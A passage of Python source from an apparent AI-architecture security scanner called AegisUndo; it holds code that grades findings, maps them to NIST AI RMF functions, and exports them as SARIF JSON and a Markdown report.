            grade = "A (Enterprise Hardened — Blast Radius Contained)"
        elif score >= 75:
            grade = "B (Moderate — Targeted Guardrail Gaps)"
        elif score >= 50:
            grade = "C (Vulnerable — Exposed Tooling / Rollback Gaps)"
        else:
            grade = "F (Critical Exposure — High Blast-Radius Architecture)"
        return score, grade

    @staticmethod
    def _compute_nist_coverage(findings: List[WeaknessFinding]) -> Dict[str, Dict[str, Any]]:
        descriptions = {
            NistFunction.GOVERN.value: "Zero-trust identity, secret isolation, HITL & anti-deepfake sign-off",
            NistFunction.MAP.value: "System prompt boundaries, MCP supply-chain & untrusted input mapping",
            NistFunction.MEASURE.value: "Memory provenance lineage, loop bounds & deterministic safety checks",
            NistFunction.MANAGE.value: "Sandbox containment, DB surgical rollbacks & GitOps IaC controls",
        }
        result: Dict[str, Dict[str, Any]] = {}
        for fn in NistFunction:
            fn_findings = [f for f in findings if f.nist_function == fn]
            result[fn.value] = {
                "description": descriptions[fn.value],
                "open_findings": len(fn_findings),
                "status": "PASS" if len(fn_findings) == 0 else ("FAIL" if any(
                    f.severity in {Severity.CRITICAL, Severity.HIGH} for f in fn_findings
                ) else "WARN"),
            }
        return result


def to_sarif_report(report: ScanReport) -> Dict[str, Any]:
    """Convert ScanReport into OASIS SARIF v2.1.0 JSON for GitHub Code Scanning / GitLab CI."""
    rules_seen: Dict[str, Dict[str, Any]] = {}
    sarif_results: List[Dict[str, Any]] = []
    level_map = {
        Severity.CRITICAL: "error",
        Severity.HIGH: "error",
        Severity.MEDIUM: "warning",
        Severity.LOW: "note",
    }

    for f in report.findings:
        if f.rule_id not in rules_seen:
            rules_seen[f.rule_id] = {
                "id": f.rule_id,
                "name": f.threat_category.replace(" ", ""),
                "shortDescription": {"text": f.title},
                "fullDescription": {"text": f.why_weak},
                "help": {"text": f.remediation},
                "properties": {"nist_ai_rmf": f.nist_function.value, "severity": f.severity.value},
            }
        sarif_results.append(
            {
                "ruleId": f.rule_id,
                "level": level_map[f.severity],
                "message": {
                    "text": f"{f.title} — {f.why_weak} | Remediation: {f.remediation}"
                },
                "locations": [
                    {
                        "physicalLocation": {
                            "artifactLocation": {"uri": f.file_path},
                            "region": {"startLine": f.line_number, "snippet": {"text": f.code_snippet}},
                        }
                    }
                ],
            }
        )

    return {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [
            {
                "tool": {
                    "driver": {
                        "name": "AegisUndo Architecture Scanner",
                        "version": "1.0.0",
                        "informationUri": "https://nist.gov/itl/ai-risk-management-framework",
                        "rules": list(rules_seen.values()),
                    }
                },
                "results": sarif_results,
            }
        ],
    }


def to_markdown_report(report: ScanReport) -> str:
    """Render an executive & engineering Markdown security assessment with honest residual risk disclosure."""
    lines = [
        "# AegisUndo Enterprise Architecture Security Report",
        "",
        f"- **Target Scanned:** `{report.target_path}`",
        f"- **Files Analyzed:** `{report.scanned_files_count}`",
        f"- **Architecture Strength Score:** **{report.architecture_score} / 100** (`{report.posture_grade}`)",
        f"- **Generated At:** `{report.generated_at}`",
        "",
        "## 1. NIST AI RMF 1.0 Pillar Posture",
        "",
        "| NIST Function | Status | Open Findings | Control Focus |",
        "| :--- | :--- | :---: | :--- |",
    ]
    for fn, meta in report.nist_rmf_coverage.items():
        lines.append(
            f"| **{fn}** | `{meta['status']}` | {meta['open_findings']} | {meta['description']} |"
        )

    lines.extend(["", "## 2. Architectural Weak Points Detected", ""])
    if not report.findings:
        lines.append("> No static/config architectural weaknesses detected across scanned files.")
    else:
        for idx, f in enumerate(report.findings, start=1):
            undo_badge = (
                "Reversible if wrapped with Aegis Ledger"
                if f.is_undoable_once_exploited
                else "IRREVERSIBLE once executed — MUST block pre-execution"
            )
            lines.extend(
                [
                    f"### {idx}. [{f.severity.value}] `{f.rule_id}` — {f.title}",
                    f"- **Location:** `{f.file_path}:{f.line_number}` (`{f.nist_function.value}`)",
                    f"- **Threat Vector:** {f.threat_category}",
                    f"- **Post-Exploit Reversibility:** *{undo_badge}*",
                    f"- **Evidence:** `{f.code_snippet}`",
                    f"- **Why It Is Weak:** {f.why_weak}",
                    f"- **How to Fix:** {f.remediation}",
                    "",
                ]
            )

    lines.extend(
        [
            "## 3. Enforced Hard Constraints & Cryptographic Guarantees",
            "",
            "| Threat Vector | Enforced Hard Constraint | Cryptographic / Architectural Guarantee |",
            "| :--- | :--- | :--- |",
        ]
    )
    for r in report.residual_risks:
        lines.append(
            f"| **{r.threat_vector}** | {r.enforced_hard_constraint} | {r.cryptographic_guarantee} |"
        )
    lines.append("")
    return "\n".join(lines)
